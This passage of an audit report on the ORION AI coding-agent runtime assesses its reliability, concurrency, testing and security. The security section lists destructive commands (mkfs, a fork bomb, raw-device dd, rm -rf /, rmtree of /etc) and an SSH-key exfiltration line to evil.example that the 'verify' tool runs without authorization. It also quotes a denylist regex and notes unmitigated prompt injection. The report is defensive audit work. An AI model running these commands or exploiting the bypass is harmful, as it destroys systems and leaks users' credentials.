a pure fold, so replay/fork/resume reconstruct the identical artifact set for free, and a content-
addressed id is *reproducible evidence* rather than a session handle. `resolveArtifact` follows the
provenance link and verifies the hash. Wave 3's manual test resolving `a_0bb7bb21eb` with a verified
sha256 from a separate process is real.

What is immature:

| Gap | Detail |
|---|---|
| **Almost never created** | E1: **0 artifacts across 170 model round-trips.** `read` is paged at 1,500 B (below the 4,096 B threshold) and `write`/`edit`/`plan` return short strings. Only unpaged `bash`/`verify` output qualifies — and at the default posture most `bash` calls escalate instead of running. |
| **No lifecycle** | no expiry, no GC, no retention policy. Every artifact is pinned by its source event forever. |
| **No navigation** | no `orionctl artifacts`, no `orionctl cat <artifact_id>`. The only reader is the SDK. |
| **No typing** | no MIME type, no encoding; content is `String(out)`. Binary output is lossy-decoded. |
| **Not a first-class agent resource** | the model cannot ask for an artifact. There is no `read_artifact` tool, so the agent's own evidence is addressable by humans and not by itself. |
| **Storage economics unmodelled** | the log holds every byte forever. `UNKNOWN — NOT YET MEASURED`: the cost of a repo-scale run with hundreds of large outputs. Deep Agents' `DeltaChannel` snapshot-every-50 exists precisely for this. |

The comparison worth drawing: OpenHarness offloads oversized output to an artifact **and gives the
agent a way to read it back**. ORION has the better identity model and the weaker loop.

---

## 8. Planning + verification assessment

The brief asks for RUNTIME guarantees and MODEL behaviour to be separated. That separation is the
whole finding.

### What the RUNTIME guarantees (verified)

| Guarantee | Status | Evidence |
|---|---|---|
| A plan is a pure fold over `plan.*` events; nothing is held in worker memory | **IMPLEMENTED AND VERIFIED** | [plan.mjs](../../v0/src/core/projection/plan.mjs); Wave 2 T3 killed a worker mid-plan and a *different* process reconstructed an identical fingerprint |
| A revision appends and never overwrites | **IMPLEMENTED AND VERIFIED** | `history` preserves every superseded revision |
| Replay/fork reconstruct the plan at zero model cost | **IMPLEMENTED AND VERIFIED** | E8: `projectPlan` on a planless v1 log returns `null` — an honest answer, not an empty shape |
| `verify` records a PASS/FAIL verdict as a machine-readable trajectory event | **IMPLEMENTED AND VERIFIED** | first line is the verdict; retained through compaction |
| A declared plan becomes the completion objective | **IMPLEMENTED AND VERIFIED** | `planSatisfied` requires every step `done` |
| Steps carry `depends_on`, defaulting to the previous step | **IMPLEMENTED AND VERIFIED** | `readySteps` needs no guessing |

These are real and they are the right guarantees. No competitor records replanning as durable
attributable history.

### What the runtime does NOT guarantee, and what that costs

**1. Step evidence is model-declared prose.** The agent writes the `evidence` string; the runtime
records the claim as a claim. Honest, and one level short. `future-queue.md` Q1 is the correct fix
and correctly deferred.

**2. Plan adherence is load-bearing for run success, and is model behaviour.** This is the important
one. Measured (E9):

| scenario | disk truth | run record | verdict |
|---|---|---|---|
| A — no plan, work done | `return a + b` | `completed` | matches |
| B — plan declared **and marked**, work done | `return a + b` | `completed` | matches |
| **C — plan declared, work done AND `verify` PASS, steps not marked** | `return a + b` | **`failed — finished_without_change`** | **record disagrees with reality** |
| D — nothing done (the Wave 0 case) | `return a - b` | `failed — finished_without_change` | matches |

In C the runtime is holding a successful mutating `tool.succeeded` and a `verify` PASS that
contradict its own verdict, and ignores both because a declared plan takes precedence. Wave 2's own
report records `qwen3:14b` ignoring the plan instruction entirely, so C is not hypothetical.

**This is a runtime design consequence, not a model failure.** Wave 1's thesis is *replace an
assertion with a fold over the log*. Wave 2 applied that to the plan and then let a **model
assertion** (`plan_step`) override **runtime evidence** (`tool.succeeded`, `verify` PASS). It has
the polarity backwards. A false negative is safer than Wave 0's false positive, but the record is
still wrong, and "the runtime's own record must never be wrong" is this project's founding claim.

**3. Verification is opt-in and unenforced.** Nothing requires `verify` before a step is marked
done. A step can be `done` with `evidence: "looks right"`.

**Assessment: ARCHITECTURALLY SOUND BUT IMMATURE.** The events, the fold and the durability are
right. The policy layer on top needs Q1 (runtime-derived evidence) before planning can be called
production-quality — and Q1 has been promoted from "nice to design later" to "required", because
E9-C is a live falsehood in the record.

---

## 9. Runtime reliability assessment

**Status: IMPLEMENTED AND VERIFIED — the strongest area of the system.** Where I found problems they
are narrow and named.

### Crash / partial-write / idempotency

`crash-matrix.json` covers 8 crash points × 2 depths = 16 injected `SIGKILL`s. All 16:
`duplicate_side_effect: false`, `world_matches_golden: true`, `correct_final_state: true`. The two
that matter:

```
after:tool.started   (before effect)  -> write:SELF_VERIFYING -> reissue(not-applied)
after:tool.effect    (before record)  -> write:SELF_VERIFYING -> skip(applied)
```

That is the crash window every other system in §4 loses, decided correctly in both directions by
asking the tool rather than guessing. ADR-011's `escalateOnUnknown` on `write` is the sharpest
detail: post-state alone cannot distinguish "never applied" from "applied, then a third party
changed it", so the pre-state witness is captured by the **runtime** (never the model) and folded
into `args` *before* `tool.started` is appended — so it survives the crash it exists to survive.

### Fencing, leases, replay, fork, resume

| Property | Evidence |
|---|---|
| Fencing | E5: 8 processes, 40 runs → 40 claims, **0 double-claims**, 0 seq gaps, 0 duplicate seqs, all 40 `completed` |
| Lease heartbeat cannot resurrect a reclaimed run | `renew()` is guarded by token **and** `lease_expires_at > now`; the heartbeat stops when the lease is genuinely lost |
| Reaper | CAS on `(lease_token, lease_expires_at)`; verified live requeuing 2 zombies |
| Replay | structurally zero model calls; 807 events in 1 ms; snapshot/full-fold equivalence asserted |
| Fork | mid-turn forks detected via unresolved tool calls, reported **and** recorded as `degraded`; `nearestTurnBoundary` suggests a clean point |
| Resume | E8: resumed a v1-era orphaned run to completion under v4 code |
| Terminal safety | `TERMINAL` set prevents double-terminalization; `appendStatus` is one fenced transaction |

### Defects found

| # | Severity | Finding |
|---|---|---|
| R1 | **HIGH** | `new Store()` fails `database is locked` on ~44% of simultaneous opens (E6: 16/36). Controlled A/B (E11): current order 16/36 fail, `busy_timeout` first **0/36**. Root cause proven; one-line fix. |
| R2 | **MEDIUM** | Recovery is **manual**. No daemon; `orionctl run` never reaps. A crashed run stays `running` until a human types `orionctl reap`. "Durable execution" that needs a human to notice the crash is half the promise. |
| R3 | **MEDIUM** | Lease semantics changed silently at Wave 1 and the docs did not follow. Since the heartbeat, a *hung but alive* worker holds its lease indefinitely — `lease_expires_at` now means "the process is gone", not "the call is slow". Wave 3's report states this; no user-facing doc does. There is no hung-worker detection. |
| R4 | **LOW** | Budget is checked at the top of the next turn, so one model call always overshoots the cap. |
| R5 | **LOW** | Every `renew()` appends a `run.lease_renewed` event. E1: 101 of 807 events (12.5%) at 100 turns are heartbeat noise; `explain` hides them but they are stored and replayed forever. |
| R6 | **LOW** | 8 of 39 event types (`plan.*`, `artifact.created`, `stream.*`) fall through `applyEvent`'s `default:` branch, whose comment still reads *"Unreachable: Store.append rejects unknown types"* ([projection/index.mjs](../../v0/src/core/projection/index.mjs)). Behaviour is correct; the stated invariant is stale. |

---

## 10. Security assessment

**The brief asks me to be explicit. I will be: ORION provides path containment for four of its seven
tools and no containment at all for the other three, and one of those three bypasses the entire
authorization system in contradiction of a written guarantee.**

### 10.1 Containment vs isolation — measured (E4)

I built a workspace with a secret file one directory above it and exercised the real `LocalSandbox`:

```
A. path-checked tools (read / write / edit / grep)
   CONTAINED? YES — read ../OUTSIDE-SECRET.txt : path escapes sandbox
   CONTAINED? YES — write ../pwned.txt          : path escapes sandbox
   CONTAINED? YES — read <absolute outside path>: path escapes sandbox

B. bash / verify (exec) — SAME sandbox object, SAME root
   CONTAINED? NO  — cat ../OUTSIDE-SECRET.txt       : TOP-SECRET-CONTENTS
   CONTAINED? NO  — cat <absolute outside path>     : TOP-SECRET-CONTENTS
   CONTAINED? NO  — echo PWNED > <outside path>     : *** file created OUTSIDE the root ***
   CONTAINED? NO  — ls ~                            : AppData / Contacts / …
   CONTAINED? NO  — network client present          : /mingw64/bin/curl

D. env scrubbing
   MY_API_KEY   -> "<scrubbed>"      HARMLESS_VAR -> "visible"
```

`exec` is `execFileSync(shell, ['-lc', cmd], { cwd: root })`
([sandbox/local:123](../../v0/src/sandbox/local/index.mjs#L123)). `cwd` is a starting directory, not
a boundary. There is **no namespace, no container, no seccomp, no Landlock, no Seatbelt, no network
policy**. Full user privileges, full filesystem, full network egress.

**To ORION's credit this is documented.** `v0/README.md:307-308` and `docs/SECURITY.md` both say so
plainly — "the sandbox enforces path containment… **not** kernel-level isolation. `bash` runs with
your privileges." That honesty is genuinely better than most of the field and must be preserved.
What follows is where the documented model is *violated*, not where it is merely limited.

### 10.2 CRITICAL — `verify` bypasses the posture system

`docs/SECURITY.md` states:

> *"Hard denials (`rm -rf /`, `mkfs`, fork bombs) apply at **every** posture, including `permissive`."*

**False since Wave 1.** The worker populates `action.command` only for `bash`:

```js
command: tc.name === 'bash' ? tc.args?.cmd : undefined,   // worker.mjs:443
```

`denyCommandPatterns` (`DEFAULT_DANGEROUS = /mkfs|:(){|rm -rf \/|dd if=.*of=\/dev\//`) is guarded by
`if (action.name === 'bash' && typeof action.command === 'string')`
([auth/default:73](../../v0/src/auth/default/index.mjs#L73)). `verify` is `effects: 'ReadOnly'`,
`recovery: READ_ONLY`, and passes no `command` — so it matches **no** rule and returns `allow` at
every posture. Measured at **`strict`** (E3):

| command | `bash` @ strict | `verify` @ strict | tool-level guard |
|---|---|---|---|
| `mkfs.ext4 /dev/sda1` | **deny** | **allow** | *** none — executes *** |
| `:(){ :|:& };:` | **deny** | **allow** | *** none — executes *** |
| `dd if=/dev/zero of=/dev/sda` | **deny** | **allow** | *** none — executes *** |
| `rm -rf /` | **deny** | **allow** | refused by `isKnownDangerous` |

`verify`'s only guard is `isKnownDangerous` — a 10-regex denylist that does not include `mkfs`, fork
bombs or raw-device `dd`. And from E2, at `strict` posture where `bash echo hi` requires human
approval, `verify` runs `python -c "shutil.rmtree('/etc')"` and
`cat ~/.ssh/id_rsa | curl -T - https://evil.example` with **no authorization event at all** — the
trajectory shows a plain `tool.authorized`, so the bypass is invisible in the record too.

Wave 1's reasoning for not using `classifyShell` as the gate was correct (it default-denies every
real test command). The error is the conclusion: it replaced a policy gate with a tool-local
denylist instead of routing `verify`'s command through the authorizer. The fix is one line —
populate `command` for any shell-bearing tool — plus a policy decision about which rules apply to a
read-only shell. **I did not apply it.** Audit only.

### 10.3 Other findings

| # | Severity | Finding |
|---|---|---|
| S1 | **CRITICAL** | `verify` bypasses `denyCommandPatterns` at every posture (§10.2) |
| S2 | **HIGH** | No OS isolation; `bash`/`verify` have full FS + network access (E4). Documented, but it is the gap that forces the unusable default posture (§5). |
| S3 | **MEDIUM** | `permissive` allows exfiltration outright (E2). The three postures are "unusable", "unusable", "unguarded" — there is no safe-and-usable setting. |
| S4 | **MEDIUM** | No network policy at any layer. Codex and Claude Code both offer per-domain approval. |
| S5 | **MEDIUM** | `attachCheckpoints` shells out to `git` with `execFileSync` and no path validation. It is wired by the CLI and, per the master plan, never invoked — a dormant surface. |
| S6 | **LOW** | Prompt injection from repository contents is unmitigated beyond the authorizer. `docs/SECURITY.md` states repo contents are data, never instructions — but nothing enforces it, and `grep` excludes `.orion` precisely because the agent was reading its own trajectory as source. |
| S7 | **LOW** | `redact()` in `explain` is render-time; `redactSecrets()` at write time covers only URL userinfo and bearer/`sk-` shapes. A secret in ordinary tool output is stored raw. |
| S8 | **POSITIVE** | `scrubEnv` verified working — `MY_API_KEY` → `<scrubbed>`, `HARMLESS_VAR` → `visible`. |
| S9 | **POSITIVE** | The Wave 4a credential leak (fetch echoing a URL with userinfo into `model.failed`) was found by the project's *own* leak scan and fixed at the write point. That is a mature security process. |

### 10.4 Bottom line

Containment ≠ isolation, and ORION currently has **neither** for its shell tools — `bash` has no
containment by design and `verify` has no *authorization* by defect. Fix S1 immediately. Then treat
Wave 10 not as an optional backend but as the enabler of usable defaults.

---

## 11. Concurrency / load assessment

### The growth model

| Stage | Shape | What breaks first |
|---|---|---|
| **G0 — one developer, one run** | `orionctl run` | nothing. Verified working. |
| **G1 — one developer, several shells** | 2–5 CLI processes | nothing observed: 36/36 concurrent `orionctl list` succeeded. Process-start jitter hides R1. |
| **G2 — one host, N parallel workers** | a supervisor forking workers (the `eval/` shape) | **R1: `new Store()` fails ~44% of simultaneous opens** (E6/E11). This is the first bottleneck. |
| **G3 — sustained multi-worker load** | continuous claim/append | **single-writer SQLite.** Measured ceiling ≈ **2,837 events/sec** with 8 processes on this machine. Every `append` is a `BEGIN IMMEDIATE` transaction; every heartbeat is an event (R5). |
| **G4 — many runs, long retention** | 10⁵–10⁶ events | **`claim()` is a single-row `ORDER BY created_at LIMIT 1` scan** with no fairness, no batching, no priority. `resolve()` in the CLI does `listRuns({limit:1000})` and a linear scan **on every command**. |
| **G5 — multiple hosts** | shared queue | **impossible today.** SQLite on a local filesystem; no network protocol, no server mode. Would require a Postgres store behind the same interface. |

### Measured

**E5 — 8 worker processes, 40 runs, one SQLite file:**
```
claims_total 40 · distinct_runs_claimed 40 · DOUBLE_CLAIMED_RUNS 0
runs_with_seq_gap 0 · runs_with_dupe_seq 0 · final_statuses {completed: 40}
events_per_sec 2837 · wall_ms 141
worker_errors: 2 x "database is locked" at Store construction
```
**Correctness under contention is excellent. Availability under contention is not.**

**E6 — concurrent `new Store()` on an existing WAL database:**
```
opens= 2  ok=1  FAILED=1      opens= 8  ok=4  FAILED=4
opens= 4  ok=3  FAILED=1      opens=16  ok=8  FAILED=8
```
Reproduced across three runs. Does **not** occur when another process is already writing (that
serialises the opens), which is why it hides in casual use.

**E11 — controlled A/B, identical WAL database and real schema, 36 concurrent opens:**
```
store-order (busy_timeout LAST)   ok=20  FAILED=16
busy-first  (busy_timeout FIRST)  ok=36  FAILED=0
```
Root cause: [store.mjs:64-68](../../v0/src/core/run/store.mjs#L64) issues `PRAGMA journal_mode=WAL`
before `PRAGMA busy_timeout=5000`, so the first lock-taking statement runs with **no** busy timeout
and fails immediately instead of waiting.

### Other bottlenecks

| # | Finding |
|---|---|
| C1 | **No work distribution or fairness.** In E5 one worker took all 40 runs; the rest exited on their first empty claim. `claim()` has no batching, no priority, no starvation guard. |
| C2 | **Heartbeat write amplification.** 12.5% of events at 100 turns are `run.lease_renewed` (E1). Three beats per lease per model call, forever, in the durable log. |
| C3 | **`resolve()` is O(runs) per CLI command** — `listRuns({limit:1000})` then a linear scan. Degrades once a user has thousands of runs. |
| C4 | **No connection pooling / one `DatabaseSync` per Store, synchronous.** Every append blocks the event loop. Fine for one agent; a hard ceiling for a service. |
| C5 | **No backpressure, no queue depth, no admission control.** |
| C6 | `UNKNOWN — NOT YET MEASURED`: behaviour at 10⁵–10⁶ events per run, and total DB size for a month of real use. ADR-001 cites 10.2 kB projection at 1,000,000 events for the *projection*; the *log* growth was not measured here. Recipe in §21. |

---

## 12. JS / TS / Python architecture assessment

**Recommendation: GRADUAL TYPESCRIPT — types at the boundary only, JSDoc-first, no rewrite.**

### The evidence

- 4,741 LOC across 22 `.mjs` modules; largest is 778 lines. This is a small, legible codebase.
- **Zero production dependencies.** `node:sqlite`, `node:crypto`, `node:child_process`, `fetch`.
  That is a genuine strategic asset: no supply chain, no build step, `npm install -g` and run.
- 66 public exports with **no type definitions at all**.
- Bugs found in this audit that types would have caught: the inverted streaming capabilities (§3.2)
  — a `Provider` interface requiring `invokeStream` whenever `capabilities` includes `'streaming'`
  makes that state unrepresentable. The `step` vs `step_id` argument confusion I hit while writing
  E9 is the same class.
- Bugs types would **not** have caught: S1 (`verify` bypass), R1 (PRAGMA order), the unwired CLI,
  compaction never firing, E9-C. **All five of the most serious findings are semantic.**

### Against each fixed option

| Option | Verdict |
|---|---|
| **Stay JS** | Rejected. 66 untyped exports is a real adoption barrier and the capability-mismatch bug is exactly what types prevent. |
| **Gradual TS** | **RECOMMENDED.** JSDoc + `checkJs` + a generated `.d.ts` keeps zero dependencies (`typescript` is devDependency-only), keeps the no-build-step property for consumers, and types the five contracts that matter: `Event`, `ModelResult`/`Provider`, `Tool`, `RecoveryContract`, `Authorizer`. Incremental, reversible, no runtime change. |
| **Justified full migration** | Rejected. Would touch every file, invalidate the crash/replay assurance built over four waves, and fix none of the top five findings. Not justified by evidence. |
| **Justified Python subsystem** | Rejected for the runtime — a second language would fracture the event contract and double the recovery surface. **Conditionally justified for `eval/` only**, which is already separate by rule and where the scientific-Python ecosystem is genuinely stronger. That is not a runtime decision. |

**Do not rewrite.** The architecture is not the problem. The product surface is.

---

## 13. Testing maturity

**Status: IMPLEMENTED BUT WEAK — high coverage of mechanisms, systematically blind to the shipped
configuration.**

### What is strong (and unusual)

904 assertions / 30 suites / 7,370 test LOC against 4,741 source LOC. Reproduced independently.
Real `SIGKILL` crash injection at 8 named hook points × 2 depths, each asserting the world matches a
golden state and no effect duplicated. A real multi-process concurrency storm. Replay-equivalence
tests per wave. A real HTTP server that speaks the OpenAI wire format and can be told to misbehave.
Wave 4's S8 — *a streamed run and a non-streamed run must reach the same final projection* — is a
test that decides whether a feature is allowed to exist. Very few projects have anything like it.

### The structural blind spot

**The suite tests mechanisms with hand-supplied configuration and never tests the configuration the
product ships with.** Four confirmed occurrences:

| Wave | What passed | What shipped |
|---|---|---|
| 0 (pre-1) | `completionContract` tested | CLI passed `null` → false success |
| 0 (pre-1) | Gemma shim tested | `shims = []` → shim never fired |
| 2 | `plan` tool tested | array args broken through the shim; found only on a real terminal |
| 3 | compaction tested | never fires on real runs (E1: 0/170) |
| **4** | **streaming tested with `capabilities:['tools','streaming']`** | **`createProvider` defaults are inverted; unreachable** |

Wave 1's report says two of the three defects "654 passing assertions could not see". Wave 2's says
the same of 700+. Wave 3's of 748. This is now 904 and the pattern has recurred. **The §8 manual
gate is a compensating control for a missing test class, and it does not scale.**

### Other gaps

| # | Gap |
|---|---|
| T1 | **No shipped-configuration tests.** Nothing constructs a subject the way `cli/index.mjs` does. |
| T2 | **No property-based tests** on the reducer, despite `fold` being pure and total — an ideal target. |
| T3 | **No load or soak tests.** E1/E5/E6 are the first performance measurements in the tree. |
| T4 | **No mutation testing**, so assertion strength is unknown. |
| T5 | **No security regression suite for the authorizer as a policy surface.** The `security` suite tests path containment; nothing asserts "no tool may reach the shell without `denyCommandPatterns` applying" — which is exactly S1. |
| T6 | **No cross-version replay corpus.** E8 had to synthesise a v1 log. A frozen `tests/fixtures/logs/v1/…v4/` corpus, replayed every CI run, is the regression test for the project's headline compatibility claim. |
| T7 | `v0/tests/results-*.json` are tracked and rewritten by every run — the suite dirties the working tree. |
| T8 | Wave 3's report records **two test-side defects** that made a working feature look broken. Test code has no review gate of its own. |

### The one change that matters most

Add a `tests/shipped/` suite whose only rule is: **construct every subject exactly as
`src/cli/index.mjs` constructs it.** It would have caught D2, D3, the Wave 4 capability inversion,
and streaming being unreachable. It is a day of work and it retires the class.

---

## 14. Critical architectural risks

| # | Risk | Sev | Evidence | Why it matters |
|---|---|:--:|---|---|
| **A1** | `verify` bypasses the authorization posture, contradicting `SECURITY.md` | **CRITICAL** | E3, E2 | A written guarantee is false. A prompt-injected model reaches `mkfs`/fork-bomb/`dd` at `strict`. |
| **A2** | The published artifact contains the defects four waves were built to fix | **CRITICAL** | npm `0.1.2` @ 2026-09-03 vs `00b68a6` @ 2026-09-04 | Every real user of ORION today is running the build that lies about completion. |
| **A3** | "Implemented but unwired" is now a repeating structural pattern | **HIGH** | four waves, four occurrences | Waves 5–10 at this rate produce a runtime of unreachable features. |
| **A4** | No isolation ⇒ no safe autonomy ⇒ unusable defaults | **HIGH** | E2, E4 | ORION cannot be pleasant to use until it can safely auto-allow. Blocks adoption outright. |
| **A5** | Long-horizon context degrades by silent unbounded forgetting | **HIGH** | E1: 162 dropped @ 100 turns, 0 compactions, no retrieval | The task statement itself scrolls out. Directly limits the long-running work ORION is *for*. |
| **A6** | The completion gate produces false negatives on real work | **HIGH** | E9-C | The founding claim is that the record is never wrong. It is wrong in a new direction. |
| **A7** | `new Store()` fails ~44% of simultaneous opens | **HIGH** | E6, E11 (A/B) | Breaks the multi-worker deployment fencing exists to serve. |
| **A8** | Docs assert guarantees the code no longer meets | **MEDIUM** | README "31 types" ×4 vs 39; "654 assertions" vs 904; `SECURITY.md` hard denials | Documentation drift on a project whose entire value proposition is *trustworthy records*. |
| **A9** | Recovery is manual | **MEDIUM** | no daemon; `orionctl run` never reaps | Durability that needs a human to notice the crash. |
| **A10** | Single-host, single-writer, no server mode | **MEDIUM** | SQLite + local FS; 2,837 ev/s ceiling | Caps the system at G4 forever without a store abstraction. |
| **A11** | Growing the frozen contract is now routine (v1→v4 in three waves) | **MEDIUM** | `EVENT_CONTRACT_VERSION = 4` | Additive discipline is holding (E8 proves it) — but "closed set" is losing meaning, and Waves 7/8 add more. |
| **A12** | Event-log storage economics unmodelled | **LOW** | R5: 12.5% heartbeat events; no GC, no retention | `UNKNOWN — NOT YET MEASURED`. Deep Agents built `DeltaChannel` for exactly this. |
| **A13** | The contract version is not recorded in the log | **LOW** | `EVENT_CONTRACT_VERSION` is a module constant | A reader must *infer* a log's version from which types appear. Cheap to fix in `run.created`. |

---

## 15. Standard capability gaps

Ranked as the brief requires. "Critical" = blocks adoption by a developer who would otherwise want
ORION for its durability.

### CRITICAL
1. **Real sandboxing (OS isolation)** — unblocks safe auto-allow. Everything about usability follows.
2. **Usable permission defaults** — allowlist, session grants, per-project rules. Today: escalate on `npm test`.
3. **Streaming reachable at the CLI** — implemented; unwire the wiring bug. Every competitor streams.
4. **Glob + regex search** — `String.includes` is not a code-search tool.
5. **Project instructions (`ORION.md`/`AGENTS.md`)** — no way to tell ORION your conventions.
6. **Publishing** — Waves 1–4 are invisible to users.

### IMPORTANT
7. **MCP** — the ecosystem standard; every competitor has it. Master plan is right: after Wave 5.
8. **Sessions / turns as a product projection** — TrueForge's lesson; ORION has the events already.
9. **Git integration** — status/diff/branch/commit as first-class, not shell-escalated.
10. **Model switching at runtime** — `ORION_MODEL` is start-time only.
11. **Cost / token visibility** — tracked in the projection, surfaced only in `status --json`.
12. **Long-horizon context strategy** — priority ordering, retrieval, continuation.
13. **Subagents** — `child.*` reserved and emitted by nothing.
14. **TypeScript types** — 66 untyped exports.
15. **`--json` everywhere** — 3 of 11 commands.

### USEFUL
16. Skills (OpenHarness's scope-precedence model is the one to copy) · 17. Memory · 18. Web fetch ·
19. Trajectory search/filter/paging · 20. Background execution · 21. Artifact navigation CLI ·
22. Automatic reaping (a daemon or opportunistic reap) · 23. Workspace checkpoints actually invoked

### DIFFERENTIATOR (ORION-only; invest here)
24. **Runtime-derived step evidence** (Q1) — now required, not optional (§8)
25. **Cross-run trajectory analysis** — the substrate is unique; nothing reads across runs yet
26. **Failure attribution across model/provider/runtime/tool** — Wave 4a's digest made this possible; nothing consumes it
27. **Trajectory diff** — compare two runs of the same task. Only ORION can do this honestly.
28. **CI mode** — the most credible near-term wedge: a harness whose CI record is auditable and replayable

### NICE-TO-HAVE
29. LSP · 30. IDE extension · 31. Web UI · 32. Sharing links

### NOT WORTH IT
33. Skills marketplace · 34. Vector DB before measured retrieval need · 35. Broad provider catalog ·
36. Workflow engine for planning · 37. Multi-tenancy before demand · 38. Autonomous self-modification ·
39. Full TS/Python rewrite · 40. Chasing Claude Code's feature list

---

## 16. ORION differentiators — assessed individually

The brief asks the hard question of each: **genuinely valuable to a developer, with a concrete
workflow — or technically impressive but not developer-useful?**

### 1. Durable trajectories — **GENUINELY VALUABLE**
*Workflow:* an overnight refactor across 40 files dies at 3 a.m. when the laptop sleeps. In the
morning `orionctl resume` continues from event 312 with the plan intact and no edit re-applied.
Verified: E8 resumed a run orphaned mid-`edit` and the file was correctly fixed.
Every competitor either loses the run or replays the conversation and re-applies effects.

### 2. Append-only events — **GENUINELY VALUABLE (as a foundation)**
Not a user-facing feature; it is what makes 3, 4, 5, 6, 8 and 10 *possible*. The right test is
whether it costs anything: E1 says no — 807 events replay in 1 ms and the projection stays at 8.8 kB.
The cost is discipline (a frozen vocabulary) and log growth (A12), both manageable.

### 3. Effect-aware recovery — **GENUINELY VALUABLE — the crown jewel**
*Workflow:* CI kills a job mid-`write` on a deploy manifest. On retry ORION asks the tool *did this
land?*, finds the pre-state witness intact, and re-issues exactly once. If the file changed for a
reason it cannot attribute, it **escalates instead of overwriting**. Verified across 16 crash points
with zero duplicate effects. **No other system audited can do this**, and it is the difference
between "resumable" and "safe to resume".

### 4. Fencing — **GENUINELY VALUABLE, currently under-exercised**
*Workflow:* a hung worker is presumed dead and a second is started; the first wakes and tries to
write. Verified: it cannot (E5, 0 double-claims). Valuable **today** for anyone running more than one
worker, which is nobody yet, so it is insurance. Note R3: a hung-but-alive worker is now *never*
reaped.

### 5. Deterministic zero-model-call replay — **GENUINELY VALUABLE, currently under-served**
*Workflow:* a run did something unexpected on Friday. On Monday `orionctl replay #abc --at 47`
reconstructs exactly what the agent believed at event 47 — free, offline, on another machine.
Verified: 1 ms for 807 events, and it works on a v1 log under v4 code (E8). The gap is that
`replay` currently only re-derives a *summary*; there is no diff, no comparison, no
"what did the model actually see at turn 12". The mechanism is more valuable than the current UI
lets a developer extract.

### 6. Fork / lineage — **GENUINELY VALUABLE, with a sharp edge**
*Workflow:* the agent takes a wrong turn at event 30. `fork --at 30` branches history and tries a
different instruction without re-paying for the first 30 events. Better than every competitor's
"start over".
**The sharp edge, and it is the honest thing to say: the fork does not rewind the workspace.** The
CLI warns (`note: the WORKSPACE is not rewound automatically`) and `attachCheckpoints` exists to fix
it and is **never invoked**. So today's fork gives you a coherent *history* over an incoherent
*world*. Half-delivered.

### 7. Durable pause — **GENUINELY VALUABLE**
*Workflow:* the agent needs a credential at 5 p.m. The run pauses in the log, the **process exits**
(no held terminal, no timeout), and next morning `orionctl answer … approve && orionctl resume`
continues. Verified. Claude Code and Codex block an interactive session instead. For unattended and
CI work this is strictly better.

### 8. Provenance (request digest, endpoint host, params, shim/degradation records) — **GENUINELY VALUABLE, unconsumed**
*Workflow:* a task fails on Tuesday and passes on Wednesday with the same prompt. The digests differ
→ the harness changed the request. The digests match and the outputs differ → the model or provider
changed. This is the direct answer to the project's most reproducible finding — 21 infrastructure
defects, ~16 first presenting as agent failures. **But nothing reads it yet**: no CLI surface, no
comparison tool, no eval integration. The evidence is being collected and never used.

### 9. Truthful completion — **GENUINELY VALUABLE, currently mis-calibrated**
*Workflow:* a CI job says the fix is done. With ORION, "done" means a mutating tool actually
succeeded or a declared plan is actually satisfied — not that the model said so. Verified catching
the Wave 0 case (E9-D). **But E9-C shows it now reports failure on genuinely completed, verified
work.** Uniquely valuable *and* the one differentiator currently producing a wrong record.

### 10. Versioned additive event contract — **GENUINELY VALUABLE, quietly the most under-sold**
*Workflow:* an incident review needs a run from six months and three releases ago. Verified in E8: a
v1 log, orphaned mid-edit, was read, replayed, projection-equivalent, forked **and resumed to
completion** under v4 code, and still replays afterwards as a mixed v1+v4 log. **This is the
audit-staple question and the answer is yes, demonstrated.** No competitor makes this promise; most
cannot, because their durable unit is a mutable transcript.

### 11. Trajectory-derived projections (plan, artifacts, state — all folds, nothing stored) — **GENUINELY VALUABLE (as a discipline)**
Not a feature a developer asks for; it is *why* the plan survives a `SIGKILL`, why a fork
reconstructs it for free, and why adding a projection costs a function rather than a migration.
Verified: Wave 2 T3 (a different process folds an identical plan fingerprint); E8 (`projectPlan`
returns `null` on a planless v1 log — honest, not an empty shape).
**Caveat:** it also created E9-C. A fold is only as good as the events it folds, and the plan fold
currently privileges a model assertion over runtime evidence.

### Summary

| Differentiator | Verdict |
|---|---|
| Durable trajectories | valuable, delivered |
| Append-only events | valuable, foundational, cost verified low |
| Effect-aware recovery | **valuable, uncontested, the crown jewel** |
| Fencing | valuable, insurance until multi-worker is real |
| Deterministic replay | valuable, **under-served by the UI** |
| Fork / lineage | valuable, **half-delivered** (workspace not rewound) |
| Durable pause | valuable, delivered, better than competitors for CI |
| Provenance | valuable, **collected but unconsumed** |
| Truthful completion | valuable, **mis-calibrated** (false negatives) |
| Versioned contract | **valuable, proven, under-sold** |
| Trajectory-derived projections | valuable as discipline; needs Q1 |

**Nothing on this list is "technically impressive but not developer-useful."** Every one has a
concrete workflow. Four are under-delivered at the product surface (replay UI, fork workspace,
provenance consumption, completion calibration) — which is the same finding as §1.3 in a different
register: the mechanisms are ahead of the product.

---

## 17. Recommended target architecture

Designed for the correctness, security and scale problems found above. **Not feature accretion.**
Every element traces to a numbered finding.

### 17.1 Principles (unchanged, and they held up)

1. Everything an agent does becomes attributable execution state.
2. The event log is the only source of truth; everything else is a fold.
3. The type set is closed and only ever grows. (E8 proves the value.)
4. Never guess about an effect. Escalate.
5. Nothing degrades silently.

**One new principle, earned by four waves of evidence:**

6. **A mechanism does not exist until the shipped configuration reaches it.** Every wave must add a
   `tests/shipped/` assertion that the *product* — not a test fixture — can reach the new capability.

### 17.2 Target shape

```
┌───────────────────────────────────────────────────────────────────────┐
│  SURFACES        orionctl · REPL · SDK (typed) · [later] server        │
│                  ── all construct subjects through ONE composition ──  │
├───────────────────────────────────────────────────────────────────────┤
│  COMPOSITION ROOT (new)          §14/A3 — kills "implemented but       │
│    createRuntime({workspace, provider, posture, stream, …})            │
│    ONE factory. CLI, REPL, SDK and tests all call it.                  │
├───────────────────────────────────────────────────────────────────────┤
│  POLICY           authorize(action, ctx) -> allow|deny|escalate        │
│    §10/A1 — EVERY shell-bearing tool passes `command`.                 │
│    + grant store (session / project allowlists)  §5, A4                │
├───────────────────────────────────────────────────────────────────────┤
│  EXECUTION        Worker (the loop)                                    │
│    + hung-worker detection (progress deadline, not lease)  §9/R3       │
├───────────────────────────────────────────────────────────────────────┤
│  BOUNDARY (new)   SandboxBackend interface                             │
│    local (containment, honest)  |  container (real isolation)  A4      │
│    + network policy per domain                            §10/S4       │
├───────────────────────────────────────────────────────────────────────┤
│  CONTEXT          bounded projection (keep)                            │
│    + priority ordering: task, plan, last verdict PINNED    §6/A5       │
│    + retrieval tool emitting `context.retrieved` (reserved) §6         │
